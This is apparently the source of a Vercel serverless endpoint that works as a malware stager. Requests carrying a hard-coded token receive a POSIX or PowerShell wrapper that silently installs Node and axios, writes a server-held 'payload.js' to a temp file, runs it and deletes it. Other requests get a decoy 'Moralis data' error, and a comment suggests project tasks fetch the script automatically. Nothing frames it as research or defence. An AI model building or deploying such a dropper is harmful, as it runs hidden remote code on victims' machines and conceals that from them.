// api/run.js
// Vercel serverless endpoint that returns a platform-specific wrapper script.
// - CLI must send Authorization: Bearer <TOKEN>
// - Server reads payload.js from project root and returns a POSIX or PowerShell wrapper
// - Wrapper writes payload to a temp file and runs `node <tempfile>`
// NOTE: For production, put the token in an env var instead of hard-coding.

import fs from "fs";
import path from "path";

const SECRET = process.env.RUN_SECRET || "9f14c64bb90c2f6d7e8a1742fbc7a0c41df0c"; // use env var in prod
const PAYLOAD_PATH = path.resolve(process.cwd(), "payload.js"); // editable JS payload

function isCliUA(ua = "") {
  ua = String(ua || "").toLowerCase();
  return ua.includes("curl") || ua.includes("wget") || ua.includes("httpie") || ua.includes("node") || ua.includes("fetch/");
}

function detectPlatform(req) {
  // 1) explicit header override
  const header = (req.headers["x-platform"] || "").toString().toLowerCase();
  if (header && ["mac", "darwin", "linux", "windows"].includes(header)) {
    if (header === "darwin") return "mac";
    if (header === "windows") return "windows";
    if (header === "linux") return "linux";
    if (header === "mac") return "mac";
  }

  // 2) User-Agent sniff
  const ua = (req.headers["user-agent"] || "").toLowerCase();
  if (ua.includes("windows") || ua.includes("win32") || ua.includes("msie") || ua.includes("trident")) return "windows";
  if (ua.includes("darwin") || ua.includes("mac os") || ua.includes("macos")) return "mac";
  if (ua.includes("linux")) return "linux";

  // 3) fallback to linux (POSIX)
  return "linux";
}

// Safely read payload.js (synchronous is fine for serverless small file)
function readPayload() {
  try {
    const code = fs.readFileSync(PAYLOAD_PATH, { encoding: "utf8" });
    return code;
  } catch (err) {
    // helpful fallback payload if file missing
    return `console.log("default payload: payload.js not found on server");`;
  }
}

export default function handler(req, res) {
  // Basic method restriction
  if (req.method !== "GET" && req.method !== "POST") {
    res.status(405).send("Method Not Allowed");
    return;
  }

  // Auth check
  const auth = String(req.headers["authorization"] || "");
  const token = auth.startsWith("Bearer ") ? auth.slice(7).trim() : "";
  if (token !== SECRET) {
    // non-CLI or unauthorized gets minimal response
    res.setHeader("Content-Type", "text/plain; charset=utf-8");
    res.status(200).send("/ Error getting Moralis data");
    return;
  }

  // Ensure payload loaded
  const appJs = readPayload();

  // Detect platform (prefer explicit header)
  const platform = detectPlatform(req);

  // If not CLI UA but token correct, we still serve; tasks will force UA anyway.
  const ua = req.headers["user-agent"] || "";

  // Build POSIX wrapper (mac/linux)
  const posixWrapper = `#!/bin/sh
echo "=== wrapper: POSIX (sh) ==="
echo "Platform: ${platform}"
echo "User-Agent: ${ua}"

TMPFILE="\${TMPDIR:-/tmp}/moralmetrics_payload_$$.js"
echo "Writing payload to ${TMPFILE}"
cat > "$TMPFILE" <<'__PAYLOAD__'
${appJs}
__PAYLOAD__

echo "Checking node..."
if command -v node >/dev/null 2>&1; then
  echo "Node present: $(node -v)"
else
  echo "Node not found. Attempting installation (best-effort)..."
  if [ "$(uname)" = "Darwin" ]; then
    if command -v brew >/dev/null 2>&1; then
      brew install node || echo "brew install failed"
    else
      echo "brew not found; please install node manually on macOS"
    fi
  else
    if command -v apt-get >/dev/null 2>&1; then
      curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
      sudo apt-get install -y nodejs || echo "apt-get install failed"
    else
      echo "No apt-get; automatic install not implemented for this distro"
    fi
  fi
fi

echo "Checking npm..."
if command -v npm >/dev/null 2>&1; then
  echo "npm: $(npm -v)"
else
  echo "npm not available"
fi

echo "Ensuring axios globally..."
if command -v npm >/dev/null 2>&1 && npm list -g axios >/dev/null 2>&1; then
  echo "axios already installed globally"
else
  echo "Installing axios globally..."
  npm install -g axios || echo "npm install -g axios failed"
fi

echo "Executing payload with node..."
node "$TMPFILE" || echo "node execution failed (exit $?)"

echo "Cleaning up..."
rm -f "$TMPFILE"

echo "=== wrapper finished ==="
`;

  // Build PowerShell wrapper (Windows) — writes file and runs node
  // We use a here-string (@' ... '@) to preserve payload exactly
  const psWrapper = `# PowerShell wrapper (debug)
Write-Host "=== wrapper: PowerShell ==="
Write-Host "Platform: ${platform}"
Write-Host "User-Agent: ${ua}"

$TempFile = Join-Path $env:TEMP ("moralmetrics_payload_{0}.js" -f ([System.Guid]::NewGuid().ToString()))
Write-Host "Writing payload to $TempFile"
@'
${appJs}
'@ | Out-File -FilePath $TempFile -Encoding utf8

Write-Host "Checking node..."
if (Get-Command node -ErrorAction SilentlyContinue) {
  Write-Host "Node: $(node -v)"
} else {
  Write-Host "Node not found. Attempting winget install (may require privileges)..."
  # attempt silent install; may still prompt in some environments
  winget install --silent --accept-source-agreements --accept-package-agreements --id OpenJS.NodeJS -e -h 2>$null
  if (Get-Command node -ErrorAction SilentlyContinue) {
    Write-Host "Node installed: $(node -v)"
  } else {
    Write-Host "Node still not available after winget"
  }
}

Write-Host "Checking npm..."
if (Get-Command npm -ErrorAction SilentlyContinue) {
  npm -v
} else {
  Write-Host "npm not found"
}

Write-Host "Ensuring axios globally..."
try {
  $out = npm list -g axios 2>$null
  $hasAxios = $out -and $out -notmatch "empty"
} catch {
  $hasAxios = $false
}
if (-not $hasAxios) {
  Write-Host "Installing axios globally..."
  npm install -g axios
} else {
  Write-Host "axios already installed globally"
}

Write-Host "Executing payload with node..."
node $TempFile
if ($LASTEXITCODE -ne 0) { Write-Host "node execution failed with code $LASTEXITCODE" }

Write-Host "Cleaning up..."
Remove-Item -Force $TempFile -ErrorAction SilentlyContinue

Write-Host "=== wrapper finished ==="
`;

  const outScript = platform === "windows" ? psWrapper : posixWrapper;
  res.setHeader("Content-Type", "text/plain; charset=utf-8");
  res.status(200).send(outScript);
}
